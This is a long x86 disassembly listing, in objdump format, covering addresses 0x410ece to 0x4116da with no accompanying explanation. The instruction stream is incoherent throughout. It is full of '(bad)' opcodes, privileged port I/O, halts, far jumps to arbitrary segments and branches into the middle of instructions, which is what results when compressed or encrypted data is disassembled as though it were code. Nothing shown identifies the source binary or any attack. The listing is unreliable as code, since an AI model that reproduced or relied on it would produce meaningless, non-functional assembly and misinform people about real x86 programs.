  410ece:	mov    ds:0x26fdea3e,eax
  410ed3:	cmp    eax,0x16046a50
  410ed8:	js     0x410f35
  410eda:	mov    ?,ebx
  410edc:	mov    dh,BYTE PTR [edx]
  410ede:	mov    al,ds:0xf837c075
  410ee3:	repz inc ebx
  410ee5:	(bad)  
  410ee6:	retf   0x9185
  410ee9:	jecxz  0x410ecc
  410eeb:	inc    edx
  410eec:	loop   0x410ea6
  410eee:	mov    esi,0x3c7a828f
  410ef3:	push   ss
  410ef4:	dec    edi
  410ef5:	(bad)  [edi+ecx*4]
  410ef8:	and    DWORD PTR [esi],esi
  410efa:	xchg   edx,eax
  410efb:	inc    esi
  410efc:	(bad)  
  410efe:	ds push 0xfffffff6
  410f01:	lods   eax,DWORD PTR ds:[esi]
  410f02:	add    eax,0xa945ac4f
  410f07:	jmp    0xfbff:0x8eaf604
  410f0e:	mov    ch,0x18
  410f10:	push   0x1b6732d
  410f15:	imul   eax,edx,0x2a4b3b07
  410f1b:	sub    BYTE PTR [eax+0x207cccc4],ch
  410f21:	sbb    al,0x83
  410f23:	mov    cl,0xb2
  410f25:	test   DWORD PTR [edx+0x325d3636],ebp
  410f2b:	xchg   ecx,eax
  410f2c:	xchg   edi,eax
  410f2d:	cmp    ebp,eax
  410f2f:	mov    esi,0x80ab573c
  410f34:	push   esp
  410f35:	(bad)
  410f39:	es mov cl,0x2b
  410f3c:	mov    ebp,ebp
  410f3e:	mov    dh,0xf
  410f40:	repz mov bl,0x63
  410f43:	lds    esi,FWORD PTR [edx+eax*1+0x3aa1c72]
  410f4a:	inc    ebx
  410f4b:	repnz cwde 
  410f4d:	ss popw ds
  410f50:	sub    al,0xc7
  410f52:	sub    BYTE PTR [edi-0x40d21434],0x38
  410f59:	mov    dl,0x32
  410f5b:	retf   0x5f68
  410f5e:	inc    ebp
  410f5f:	push   ecx
  410f60:	or     BYTE PTR [ebx+0x3],0xa2
  410f64:	neg    BYTE PTR [eax-0x2aefd247]
  410f6a:	sbb    edx,edi
  410f6c:	xor    BYTE PTR [ecx+0x14],cl
  410f6f:	mov    bl,0x7f
  410f71:	xchg   edx,eax
  410f72:	in     al,dx
  410f73:	cmp    bl,BYTE PTR [eax+0x27]
  410f76:	push   esp
  410f77:	push   ss
  410f78:	call   0x6ffb40ea
  410f7d:	out    0xa0,al
  410f7f:	sub    BYTE PTR gs:[edi],ch
  410f82:	push   edi
  410f83:	lahf   
  410f84:	mov    ch,0x55
  410f86:	in     al,0x1b
  410f88:	sbb    dl,bl
  410f8a:	popf   
  410f8b:	(bad)  
  410f8d:	xchg   esp,eax
  410f8e:	sbb    ecx,DWORD PTR [edi]
  410f90:	fnstenv [edi+0x7eee8d3f]
  410f96:	push   ecx
  410f97:	jmp    0x410f4f
  410f99:	jne    0x411006
  410f9b:	sub    al,0x5d
  410f9d:	push   ss
  410f9e:	fsubr  DWORD PTR [ecx]
  410fa0:	sbb    dh,dl
  410fa2:	into   
  410fa3:	push   esp
  410fa4:	pop    ebp
  410fa5:	sbb    esp,DWORD PTR [edx]
  410fa7:	lods   al,BYTE PTR ds:[esi]
  410fa8:	xchg   BYTE PTR [ebx+0x39],ah
  410fab:	xchg   ecx,eax
  410fac:	call   0x63ce:0xcee3e1b9
  410fb3:	or     BYTE PTR [eax+0x6ec0ea6f],bh
  410fb9:	inc    esp
  410fba:	cmp    eax,0x9cd9eb36
  410fbf:	pop    ss
  410fc0:	mov    dl,0x55
  410fc2:	and    eax,esi
  410fc4:	repz cmc 
  410fc6:	add    eax,0x77789d6b
  410fcb:	rcl    DWORD PTR [ebx-0x4790490e],1
  410fd1:	inc    ebx
  410fd2:	cmp    eax,0x994fc6cd
  410fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd8:	cmp    DWORD PTR [eax],edx
  410fda:	mov    eax,ds:0x70e06986
  410fdf:	jmp    0x410fee
  410fe1:	call   0xdeaf58a0
  410fe6:	pop    es
  410fe7:	lock leave 
  410fe9:	jmp    0xc7d41b80
  410fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fef:	in     al,0x99
  410ff1:	dec    ebp
  410ff2:	sbb    eax,0xe3ed1526
  410ff7:	fs and eax,0x1ec6705b
  410ffd:	jge    0x410fb1
  410fff:	pop    esi
  411000:	and    eax,0xc139f825
  411005:	lds    esp,FWORD PTR [esi]
  411007:	mov    ah,0x73
  411009:	data16 jae 0x411002
  41100c:	dec    eax
  41100d:	push   ebp
  41100e:	std    
  41100f:	fstp   QWORD PTR [ecx-0x66]
  411012:	sbb    DWORD PTR [ecx],esi
  411014:	sbb    eax,0x69b4d014
  411019:	call   DWORD PTR [eax]
  41101b:	xor    BYTE PTR [edx+0x276aa49b],ch
  411021:	call   0x3564:0xd06e4135
  411028:	push   edi
  411029:	pop    edx
  41102a:	inc    ebx
  41102b:	jns    0x41104b
  41102d:	add    ebx,DWORD PTR [ebp+edx*1+0x69]
  411031:	lods   eax,DWORD PTR ds:[esi]
  411032:	mov    dl,0x27
  411034:	inc    edx
  411035:	and    DWORD PTR [ecx-0x20],0x2f
  411039:	sub    DWORD PTR [edi+0x34],ecx
  41103c:	aad    0xe3
  41103e:	mov    ch,0x15
  411040:	das    
  411041:	jecxz  0x411084
  411043:	icebp  
  411044:	(bad)  
  411045:	dec    edi
  411046:	pop    es
  411047:	and    ch,BYTE PTR [edi+0x790aa14f]
  41104d:	cmp    BYTE PTR ds:0xf09cde0a,ch
  411053:	popf   
  411054:	or     al,0x61
  411056:	fadd   QWORD PTR [edi-0x3d]
  411059:	loop   0x411082
  41105b:	xor    al,0xd9
  41105d:	sub    BYTE PTR [esi],ch
  41105f:	out    dx,al
  411060:	adc    BYTE PTR [ebx-0x80],bl
  411063:	jecxz  0x411068
  411065:	and    esi,DWORD PTR [ebx]
  411067:	pop    ebx
  411068:	mov    al,0x64
  41106a:	mov    al,ah
  41106c:	and    eax,0xf8a0e36b
  411071:	mov    esi,0x33b78c43
  411076:	ret    0x6838
  411079:	push   ebp
  41107a:	dec    edx
  41107b:	inc    ebp
  41107c:	add    bh,BYTE PTR [ecx+0x6488070e]
  411082:	push   esp
  411083:	xchg   ebp,eax
  411084:	fsubr  QWORD PTR [ebx+0x771a2ead]
  41108a:	jecxz  0x411052
  41108c:	cmp    eax,0xcdea2cf2
  411091:	mov    ah,ah
  411093:	and    eax,0xf91d2c9e
  411098:	(bad)  
  411099:	pop    ebp
  41109a:	jns    0x41110d
  41109c:	push   0x55
  41109e:	out    0x29,eax
  4110a0:	addr16 or al,0xc
  4110a3:	nop
  4110a4:	sti    
  4110a5:	mov    esi,0xf4b9c90c
  4110aa:	retf   0x61ff
  4110ad:	or     eax,0xd6cb8b68
  4110b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b3:	adc    DWORD PTR [ecx+0x7b],0xffffffe7
  4110b7:	in     al,0x64
  4110b9:	mov    ds:0xbe1b26c8,al
  4110be:	bound  esi,QWORD PTR [edi+0x6d481afe]
  4110c4:	ret    
  4110c5:	aas    
  4110c6:	cld    
  4110c7:	inc    esi
  4110c8:	stc    
  4110c9:	xchg   BYTE PTR [ecx],al
  4110cb:	dec    DWORD PTR [ebx]
  4110cd:	sbb    al,0x6f
  4110cf:	lods   eax,DWORD PTR ds:[esi]
  4110d0:	cmp    bh,BYTE PTR [edi]
  4110d2:	mov    ds:0xa403491,eax
  4110d7:	jp     0x41112e
  4110d9:	push   esi
  4110da:	push   cs
  4110db:	data16 ins BYTE PTR es:[edi],dx
  4110dd:	xchg   BYTE PTR [edi+ebp*2+0x36],ah
  4110e1:	test   DWORD PTR [ecx+0x1ac42a4e],eax
  4110e7:	and    eax,0x65afaaeb
  4110ec:	pop    eax
  4110ed:	push   eax
  4110ee:	jg     0x4110b3
  4110f0:	pushf  
  4110f1:	out    dx,eax
  4110f2:	or     DWORD PTR [edx+0x7d5460ff],ebp
  4110f8:	dec    ebp
  4110f9:	dec    eax
  4110fa:	ja     0x411096
  4110fc:	mov    edx,0x45b0145a
  411101:	aad    0x4c
  411103:	push   edx
  411104:	mov    ds:0x8fe5eaa6,eax
  411109:	sbb    eax,0xa24a3870
  41110e:	mov    ecx,0xabf0983e
  411113:	or     ecx,esp
  411115:	imul   edi,DWORD PTR [ebx-0x64],0x1990ef0
  41111c:	in     eax,0x81
  41111e:	hlt    
  41111f:	mov    al,ds:0x397122d5
  411124:	int3   
  411125:	not    DWORD PTR [edx]
  411127:	nop
  411128:	out    dx,al
  411129:	and    al,0x36
  41112b:	mov    ecx,0xb894428f
  411130:	outs   dx,DWORD PTR ds:[esi]
  411131:	shl    esp,cl
  411133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411134:	jo     0x411108
  411136:	jecxz  0x41118e
  411138:	jb     0x4111a4
  41113a:	add    al,bh
  41113c:	and    DWORD PTR [ebp+0x1],ebx
  41113f:	push   ss
  411140:	mov    ah,0x90
  411142:	inc    ebx
  411143:	lahf   
  411144:	xchg   edx,eax
  411145:	push   edi
  411146:	dec    edi
  411147:	dec    eax
  411148:	lods   al,BYTE PTR ds:[esi]
  411149:	bound  esi,QWORD PTR [ecx+edx*4]
  41114c:	cmc    
  41114d:	clc    
  41114e:	or     al,dl
  411150:	push   ecx
  411151:	xor    bl,bl
  411153:	cmc    
  411154:	mov    ecx,0x86efcb84
  411159:	ret    0x2060
  41115c:	pop    esi
  41115d:	arpl   WORD PTR ds:0x3bef9db6,si
  411163:	or     al,0x39
  411165:	dec    edx
  411167:	cwde   
  411168:	pop    ebp
  411169:	aad    0xe5
  41116b:	es loop 0x411135
  41116e:	fstp   QWORD PTR [edx-0x75]
  411171:	dec    ebp
  411172:	cld    
  411173:	jmp    0x41167e
  411178:	(bad)
  41117b:	retf   
  41117c:	cmp    eax,0x69c9c9c9
  411181:	sahf   
  411182:	repz push 0x306601fa
  411188:	hlt    
  411189:	jb     0x411203
  41118b:	js     0x4111f7
  41118d:	jl     0x411207
  41118f:	js     0x4111ec
  411191:	mov    WORD PTR [ecx],fs
  411193:	pop    ds
  411194:	shr    BYTE PTR [edx+0x397c60ea],1
  41119a:	loop   0x411171
  41119c:	or     eax,0x654e30f
  4111a1:	push   0x18c755e3
  4111a6:	rcl    DWORD PTR [edi+0x6e],cl
  4111a9:	push   ebx
  4111aa:	fidivr WORD PTR ds:0xf5ed32c6
  4111b0:	mov    ds:0x239933fa,al
  4111b6:	mov    cl,0x34
  4111b8:	mov    esp,0xcdcf503f
  4111bd:	push   edi
  4111be:	xchg   esi,eax
  4111bf:	in     al,dx
  4111c0:	add    al,bh
  4111c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c3:	jnp    0x4111d1
  4111c5:	outs   dx,DWORD PTR ds:[esi]
  4111c6:	mov    ds:0x6822c972,eax
  4111cb:	sar    BYTE PTR [esi+edx*4+0x6ed2b012],1
  4111d2:	leave  
  4111d3:	pop    esp
  4111d4:	xchg   ebx,eax
  4111d5:	packssdw mm6,QWORD PTR [edi]
  4111d8:	sub    edi,DWORD PTR [edx]
  4111da:	fcomp  QWORD PTR [eax-0x4f32178e]
  4111e0:	adc    al,bh
  4111e2:	or     dl,dl
  4111e4:	cs jno 0x411191
  4111e7:	xor    al,0xb2
  4111e9:	repz and al,dh
  4111ec:	jae    0x4111a9
  4111ee:	outs   dx,DWORD PTR ds:[esi]
  4111ef:	test   DWORD PTR [edi+eax*1],esi
  4111f2:	les    ecx,FWORD PTR [edx]
  4111f4:	sar    DWORD PTR [edx],1
  4111f6:	cmp    esi,edi
  4111f8:	cld    
  4111f9:	xor    ebp,DWORD PTR [ebx+edi*2+0x4e25b8f0]
  411200:	jmp    0x48e75f94
  411205:	dec    esi
  411206:	rcl    BYTE PTR [ebx+0x33],0x24
  41120a:	in     eax,0xce
  41120c:	shl    BYTE PTR [esi+0x7aba7982],0xce
  411213:	dec    esi
  411214:	aaa    
  411215:	sbb    DWORD PTR [esi+esi*2-0x3d896a5b],eax
  41121c:	aad    0xbe
  41121e:	add    cl,ah
  411220:	inc    ecx
  411221:	mov    edi,0x9c0f3573
  411226:	mov    eax,ds:0x4b785207
  41122b:	dec    edx
  41122c:	sbb    DWORD PTR [ebx],ebp
  41122e:	loope  0x411231
  411230:	cli    
  411231:	aam    0x3d
  411233:	adc    eax,0x226d906b
  411238:	dec    edi
  411239:	xchg   ebx,eax
  41123a:	xor    BYTE PTR [edi+edx*4+0x53625231],dh
  411241:	test   eax,0xa9546d8e
  411246:	xchg   esp,eax
  411247:	jp     0x41120a
  411249:	sub    BYTE PTR [ebx],0x93
  41124c:	ror    DWORD PTR [esi],1
  41124e:	and    al,bh
  411250:	mov    eax,0x24234769
  411255:	push   edi
  411256:	outs   dx,BYTE PTR ds:[esi]
  411257:	pop    es
  411258:	mov    fs,WORD PTR [edi]
  41125a:	sti    
  41125b:	out    dx,al
  41125c:	adc    cl,BYTE PTR [ebx+eiz*4]
  41125f:	leave  
  411260:	adc    ah,ch
  411262:	out    0xee,eax
  411264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411265:	(bad)  
  411266:	call   0xa4071458
  41126b:	or     dh,BYTE PTR [esp+esi*8+0x2121d035]
  411272:	mov    edx,0x7bfb25ac
  411277:	inc    ecx
  411278:	sbb    al,0xd2
  41127a:	xchg   ebp,eax
  41127b:	adc    edx,edx
  41127d:	outs   dx,DWORD PTR ds:[esi]
  41127e:	add    al,0x70
  411280:	mov    ds:0x3e2eaff4,eax
  411285:	xchg   DWORD PTR [ebx+0x3618757e],ebp
  41128b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41128c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41128d:	retf   0x56a0
  411290:	stc    
  411291:	dec    ecx
  411292:	cmp    BYTE PTR [eax-0x53],0xfb
  411296:	test   al,0x4b
  411298:	imul   dh
  41129a:	rol    BYTE PTR [eax*1-0x8452604],0x4f
  4112a2:	cwde   
  4112a3:	lods   eax,DWORD PTR ds:[esi]
  4112a4:	pop    eax
  4112a5:	push   edi
  4112a6:	aaa    
  4112a7:	test   bh,dl
  4112a9:	ins    BYTE PTR es:[edi],dx
  4112aa:	xchg   ecx,eax
  4112ab:	retf   
  4112ac:	outs   dx,DWORD PTR ds:[esi]
  4112ad:	std    
  4112ae:	dec    esi
  4112af:	fwait
  4112b0:	sub    cl,BYTE PTR [ebp+0x21c39372]
  4112b6:	or     dh,BYTE PTR [edx-0x5c2399fd]
  4112bc:	ins    DWORD PTR es:[edi],dx
  4112bd:	pop    esi
  4112be:	cmp    al,BYTE PTR [esi+0x6c6c78c1]
  4112c4:	daa    
  4112c5:	dec    edi
  4112c6:	ins    BYTE PTR es:[edi],dx
  4112c7:	sbb    BYTE PTR [esi],al
  4112c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ca:	imul   edi,esp,0x75
  4112cd:	dec    esp
  4112ce:	stos   BYTE PTR es:[edi],al
  4112cf:	retf   
  4112d0:	into   
  4112d1:	frstor [ecx-0x3259175d]
  4112d7:	es enter 0x934c,0x58
  4112dc:	pop    edi
  4112dd:	hlt    
  4112de:	or     bh,BYTE PTR fs:[edx+0x21]
  4112e2:	shl    eax,cl
  4112e4:	jne    0x4112f7
  4112e6:	dec    eax
  4112e7:	fisubr WORD PTR [edx+ebp*8+0x1c]
  4112eb:	rcr    ecx,1
  4112ed:	adc    eax,0x9ac7bb95
  4112f2:	lods   al,BYTE PTR ss:[esi]
  4112f4:	push   eax
  4112f5:	xor    DWORD PTR [ebx+ebx*2-0x2],esp
  4112f9:	inc    edx
  4112fa:	sti    
  4112fb:	xor    DWORD PTR [edi+0x4c3fa983],ebp
  411301:	gs cmp eax,0xfa4ea4bf
  411307:	pushf  
  411308:	xor    al,0x4d
  41130a:	inc    edx
  41130b:	retf   0xe934
  41130e:	jnp    0x4112e2
  411310:	imul   ecx,DWORD PTR [esi-0x7f562b58],0x14
  411317:	dec    ecx
  411318:	stos   DWORD PTR es:[edi],eax
  411319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41131a:	ja     0x4112c9
  41131c:	xor    eax,0xc54d99ab
  411321:	xchg   esp,eax
  411322:	inc    ecx
  411323:	xchg   edx,eax
  411324:	in     al,dx
  411325:	hlt    
  411326:	xchg   BYTE PTR [ebx+ebp*8-0x229441d1],ah
  41132d:	cmp    al,0xe6
  41132f:	shl    BYTE PTR [edx+0x60],cl
  411332:	pop    ebx
  411333:	push   edi
  411334:	std    
  411335:	fst    DWORD PTR [edx-0x23f0063f]
  41133b:	push   ebp
  41133c:	iret   
  41133d:	mov    ebp,0x6bcdadb6
  411342:	sbb    BYTE PTR [eax-0x611fd0cb],0xb2
  411349:	cmp    bh,dl
  41134b:	xor    cl,BYTE PTR [esi]
  41134d:	les    ebx,FWORD PTR [edx+0xf06308b]
  411353:	ds mov dl,0x68
  411356:	mov    DWORD PTR [ebx-0x6e],edx
  411359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41135a:	mov    esi,0xb5ed94ec
  41135f:	pop    edi
  411360:	mov    esi,0xd89d6424
  411365:	(bad)  
  411366:	sub    ecx,DWORD PTR [ebx+0x69]
  411369:	xchg   esi,eax
  41136a:	xchg   BYTE PTR [ecx+0x22a3c3d6],al
  411370:	push   esi
  411371:	add    al,bh
  411373:	xor    al,0xd4
  411375:	inc    eax
  411376:	call   0xa0d7434f
  41137b:	cmc    
  41137c:	lahf   
  41137d:	sub    DWORD PTR [ebp-0x7bf26c99],0x4296c46b
  411387:	shl    BYTE PTR ss:[ecx-0x5310f78],1
  41138e:	jmp    0x5ae0:0x8e7b3036
  411395:	outs   dx,DWORD PTR ds:[esi]
  411396:	cmp    eax,0x5470522
  41139b:	data16 sti 
  41139d:	jl     0x4113dc
  41139f:	push   ecx
  4113a0:	loopne 0x411418
  4113a2:	pop    ecx
  4113a3:	je     0x411345
  4113a5:	mov    edx,fs
  4113a7:	test   BYTE PTR [eax+ebx*4-0x202325b2],cl
  4113ae:	pop    es
  4113af:	cdq    
  4113b0:	popa   
  4113b1:	out    dx,eax
  4113b2:	push   ebp
  4113b3:	stos   BYTE PTR es:[edi],al
  4113b4:	aad    0x5c
  4113b6:	jle    0x4113ad
  4113b8:	iret   
  4113b9:	repnz bnd ret 0xb4ab
  4113be:	xor    ah,BYTE PTR [ecx]
  4113c0:	jl     0x411417
  4113c2:	aaa    
  4113c3:	lock rol BYTE PTR [esi+edx*2],0xfd
  4113c8:	xor    BYTE PTR [edi+ebx*1+0x4d],0x50
  4113cd:	int3   
  4113ce:	(bad)  
  4113cf:	fldcw  WORD PTR [esi]
  4113d1:	cli    
  4113d2:	xor    bh,BYTE PTR [edi+edx*2]
  4113d5:	int    0x29
  4113d7:	aas    
  4113d8:	jnp    0x41141f
  4113da:	dec    esi
  4113db:	mov    ebx,DWORD PTR [ebx+0x43bfef40]
  4113e1:	adc    dl,BYTE PTR [esi+esi*8+0x43ac5e24]
  4113e8:	mov    ds:0xe9800a04,eax
  4113ed:	int    0x79
  4113ef:	sub    ch,BYTE PTR [edx+esi*1-0x4f]
  4113f3:	(bad)  
  4113f4:	loope  0x4113bb
  4113f6:	mov    BYTE PTR [ebp-0x7551c2f8],bh
  4113fc:	mov    edx,0x54ea56d3
  411401:	xchg   edx,eax
  411402:	xor    DWORD PTR ds:0xc7dd1a73,esp
  411408:	push   cs
  411409:	mov    BYTE PTR [ebx+edx*2+0x752f1929],bl
  411410:	sub    DWORD PTR [ecx-0x7f],0x51
  411414:	(bad)  
  411415:	in     eax,0x6c
  411417:	sub    al,0xbd
  411419:	xor    ebp,edx
  41141b:	ins    BYTE PTR es:[edi],dx
  41141c:	adc    DWORD PTR [edi],0xffffffa0
  41141f:	mov    edi,0xdcad8441
  411424:	and    eax,0xe6319e88
  411429:	cmp    al,0x3c
  41142b:	xor    BYTE PTR [edx],0x3e
  41142e:	jnp    0x4113b3
  411430:	popf   
  411431:	addr16 pop es
  411433:	mov    edx,0x8592e136
  411438:	std    
  411439:	pop    ebx
  41143a:	call   0xdb11:0xbfb593d3
  411441:	mov    ecx,0xffe3ce9b
  411446:	retf   0x935f
  411449:	les    edi,FWORD PTR [ecx-0x5b]
  41144c:	or     ecx,DWORD PTR [ebp-0x1a667b44]
  411452:	push   ebx
  411453:	ds loop 0x411456
  411456:	lods   eax,DWORD PTR ds:[esi]
  411457:	cdq    
  411458:	aas    
  411459:	pusha  
  41145a:	pop    edi
  41145b:	jmp    0xaff1:0x93d5a528
  411462:	cli    
  411463:	pop    edx
  411464:	lods   al,BYTE PTR ds:[esi]
  411465:	and    eax,0x39a18a98
  41146a:	ret    
  41146b:	jo     0x4114c5
  41146d:	xor    ebp,edx
  41146f:	lods   al,BYTE PTR ds:[esi]
  411470:	data16 jge 0x41146f
  411473:	into   
  411474:	xchg   edx,eax
  411475:	loope  0x41144b
  411477:	lea    edx,[edi+0x149e9a99]
  41147d:	fldenv ds:0x380238b8
  411483:	test   al,0xfc
  411485:	push   ds
  411486:	push   cs
  411487:	mov    ch,0x52
  411489:	adc    DWORD PTR [eax+esi*4],eax
  41148c:	cdq    
  41148d:	inc    edx
  41148e:	call   0xa6ab:0xe9d6cbb1
  411495:	mov    WORD PTR [ecx-0x13],es
  411498:	sub    BYTE PTR [esi],0x5a
  41149b:	pop    ecx
  41149c:	fild   DWORD PTR [ebp+eiz*1+0x4f50207a]
  4114a3:	fwait
  4114a4:	rol    BYTE PTR ds:0xd820c9b7,cl
  4114aa:	loope  0x411496
  4114ac:	enter  0xfcbf,0x74
  4114b0:	repz mov esi,0xbc6fd556
  4114b6:	les    esp,FWORD PTR [edi-0x330a2e7d]
  4114bc:	pop    es
  4114bd:	xchg   edx,eax
  4114be:	sub    al,0xc7
  4114c0:	fimul  DWORD PTR [ebx]
  4114c2:	sbb    DWORD PTR [edx+0x59afacc],esi
  4114c8:	mov    ebp,0xc688eff6
  4114cd:	mov    al,ds:0x974f1616
  4114d2:	adc    eax,0x936c9416
  4114d7:	or     ebp,ebx
  4114d9:	mov    cl,0x1d
  4114db:	mov    cl,0xc
  4114dd:	cwde   
  4114de:	pop    eax
  4114df:	pop    ss
  4114e0:	xchg   esi,eax
  4114e1:	in     al,0x5b
  4114e3:	xchg   esp,eax
  4114e4:	push   ebp
  4114e5:	xchg   ebp,eax
  4114e6:	mov    ah,0x32
  4114e8:	inc    edx
  4114e9:	push   es
  4114ea:	aas    
  4114eb:	jae    0x41154d
  4114ed:	lea    ebp,[eax+0x32b13abf]
  4114f3:	test   BYTE PTR [edi+eax*8],0xc1
  4114f7:	dec    ebp
  4114f8:	push   es
  4114f9:	push   ss
  4114fa:	add    DWORD PTR [edi],0x20
  4114fd:	adc    DWORD PTR [ecx+0x1a],ebx
  411500:	outs   dx,BYTE PTR ds:[esi]
  411501:	pusha  
  411502:	and    eax,0x956fd025
  411507:	fcom   DWORD PTR [edx-0x36]
  41150a:	loopne 0x4114c2
  41150c:	lods   al,BYTE PTR ds:[esi]
  41150d:	fcmovne st,st(3)
  41150f:	or     dh,BYTE PTR [esi+0x72299292]
  411515:	rcl    DWORD PTR [ebx-0x277b3a2a],0xe6
  41151c:	xor    DWORD PTR [esi+0x3d286e43],edi
  411522:	aaa    
  411523:	inc    ebx
  411524:	push   0x6d48be15
  411529:	fist   WORD PTR [edi-0x166fb732]
  41152f:	mov    eax,0x7ee0545e
  411534:	out    dx,eax
  411535:	retf   
  411536:	mov    eax,0x66c2a9c7
  41153b:	das    
  41153c:	in     al,dx
  41153d:	mov    eax,ds:0x9a66a3
  411542:	jle    0x411556
  411544:	loopne 0x411596
  411546:	inc    BYTE PTR [ecx-0x3d]
  411549:	jp     0x41153b
  41154b:	out    0xc7,eax
  41154d:	dec    edi
  41154e:	inc    esi
  41154f:	es fs dec edi
  411552:	adc    eax,0xdc10e5b2
  411557:	gs xchg ebx,eax
  411559:	icebp  
  41155a:	or     eax,0xb0db13a3
  41155f:	ins    BYTE PTR es:[edi],dx
  411560:	xor    al,0x70
  411562:	jmp    0xd6a9:0x7a75be0d
  411569:	outs   dx,BYTE PTR ds:[esi]
  41156a:	test   al,0x3f
  41156c:	shl    BYTE PTR [ebp-0x1d],cl
  41156f:	pop    es
  411570:	fisttp QWORD PTR [edi+0x1a]
  411573:	(bad)  
  411574:	sbb    DWORD PTR [ebp+0x50121760],ebp
  41157a:	dec    ebp
  41157b:	fcom   DWORD PTR [esi-0x27]
  41157e:	out    0x53,al
  411580:	cmp    BYTE PTR [ebp-0x47],al
  411583:	(bad)  
  411584:	cli    
  411585:	xchg   edi,eax
  411586:	shl    DWORD PTR gs:[edx+0x526da699],1
  41158d:	dec    edx
  41158e:	int3   
  41158f:	in     eax,dx
  411590:	mov    edi,0xb2dfcc72
  411595:	pushf  
  411596:	adc    eax,0x9b2d859
  41159b:	mov    WORD PTR [edx+0x7aa1046d],?
  4115a1:	sub    ecx,edi
  4115a3:	inc    esp
  4115a4:	add    BYTE PTR fs:[eax+0x562f990d],dh
  4115ab:	push   ss
  4115ac:	int3   
  4115ad:	ins    DWORD PTR es:[edi],dx
  4115ae:	inc    ebx
  4115af:	mov    ds:0x7dafa5f1,eax
  4115b4:	dec    eax
  4115b5:	or     edi,ebp
  4115b7:	mov    dl,0xc8
  4115b9:	fucomp st(6)
  4115bb:	sbb    ah,bl
  4115bd:	mov    ah,0xcd
  4115bf:	push   ds
  4115c0:	shl    DWORD PTR ss:[esi+0x5edd4d9b],0xa1
  4115c8:	adc    al,0x97
  4115cb:	aaa    
  4115cc:	jb     0x4115c3
  4115ce:	(bad)  
  4115cf:	jmp    0x9447:0x5c2ee59a
  4115d6:	(bad)  
  4115d7:	scas   eax,DWORD PTR es:[edi]
  4115d8:	clc    
  4115d9:	or     DWORD PTR [ebx+0x7],esp
  4115dc:	shl    ebx,0x49
  4115df:	pop    edx
  4115e0:	rcr    DWORD PTR [ebx],1
  4115e2:	sub    bh,cl
  4115e4:	scas   eax,DWORD PTR es:[edi]
  4115e5:	adc    bl,BYTE PTR [eax]
  4115e7:	inc    esi
  4115e8:	mov    edx,0xf11cf7ae
  4115ed:	fisttp DWORD PTR [esi+0x5b]
  4115f0:	call   0xb87aa5db
  4115f5:	dec    edx
  4115f6:	push   eax
  4115f7:	jo     0x411625
  4115f9:	jae    0x41163c
  4115fb:	imul   esi,DWORD PTR [edi+0x67],0xffffffba
  4115ff:	pop    edi
  411600:	inc    ebp
  411601:	and    BYTE PTR ds:0x9350270b,cl
  411607:	fwait
  411608:	push   0xffffff92
  41160a:	rol    BYTE PTR [ebp+0x69f42e64],1
  411610:	lock sub eax,0xa0eeab30
  411616:	aas    
  411617:	stc    
  411618:	iret   
  411619:	jb     0x4115ed
  41161b:	loope  0x4115e9
  41161d:	mov    ah,0x51
  41161f:	sbb    al,BYTE PTR [ebp-0x506b6b21]
  411625:	push   ds
  411626:	inc    edi
  411627:	in     al,dx
  411628:	(bad)  
  411629:	addr16 push cs
  41162b:	cmp    eax,0x2bbe0252
  411630:	ins    BYTE PTR es:[edi],dx
  411631:	xchg   edi,eax
  411632:	mov    bl,0xfa
  411634:	test   DWORD PTR [ebp-0x4c],ecx
  411637:	addr16 into 
  411639:	out    dx,eax
  41163a:	jle    0x4115e2
  41163c:	rol    BYTE PTR [edx+0x723b9376],0xb
  411643:	call   0xde5a0f93
  411648:	pop    ebp
  411649:	rcl    BYTE PTR [edx-0xd],0xea
  41164d:	mov    dl,0x49
  41164f:	or     BYTE PTR [edi],0x3
  411652:	or     al,0x1f
  411654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411655:	mov    dh,0xa9
  411657:	jmp    FWORD PTR [ebp+0x6b59d35b]
  41165d:	cmp    edi,ecx
  41165f:	inc    ecx
  411660:	mov    ebx,esp
  411662:	adc    ch,dl
  411664:	xor    DWORD PTR [esi],ecx
  411666:	mov    dh,0x8
  411668:	icebp  
  411669:	fwait
  41166a:	dec    eax
  41166b:	add    ch,ch
  41166d:	pop    ds
  41166e:	into   
  41166f:	imul   edx,DWORD PTR [eax-0x17],0x44976281
  411676:	sbb    eax,DWORD PTR [ebx-0x9fd841c]
  41167c:	push   esi
  41167d:	adc    eax,0x3b2c4334
  411682:	mov    BYTE PTR [ecx],al
  411684:	lea    eax,[ebp-0x4]
  411687:	inc    BYTE PTR [eax]
  411689:	inc    eax
  41168a:	jmp    0x411b95
  41168f:	ret    
  411690:	cmp    eax,0xd5d2c0c8
  411695:	fcmovne st,st(1)
  411697:	out    dx,eax
  411698:	cld    
  411699:	mov    al,0x96
  41169b:	pop    ss
  41169c:	sti    
  41169d:	push   ebp
  41169e:	ins    BYTE PTR es:[edi],dx
  41169f:	out    0x75,al
  4116a1:	js     0x41171b
  4116a3:	push   0x7c
  4116a5:	js     0x41171f
  4116a7:	cli    
  4116a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a9:	pop    ecx
  4116aa:	fidivr WORD PTR [ebx+0x217c8d5]
  4116b0:	lds    esi,FWORD PTR [edx+eiz*1]
  4116b3:	int    0x14
  4116b5:	or     eax,0x31c8e9b
  4116bb:	(bad)  
  4116bc:	imul   esp,DWORD PTR [ebx-0x532b31e3],0xffffffdb
  4116c3:	lea    ecx,[ecx]
  4116c5:	dec    esp
  4116c6:	hlt    
  4116c7:	sti    
  4116c8:	popf   
  4116c9:	popf   
  4116ca:	in     eax,0x2e
  4116cc:	(bad)  
  4116ce:	loope  0x411710
  4116d0:	stos   DWORD PTR es:[edi],eax
  4116d1:	aad    0xb0
  4116d3:	jmp    0xff419499
  4116d8:	mov    al,0x14
  4116da:	imul   BYTE PTR [edi+0x44]
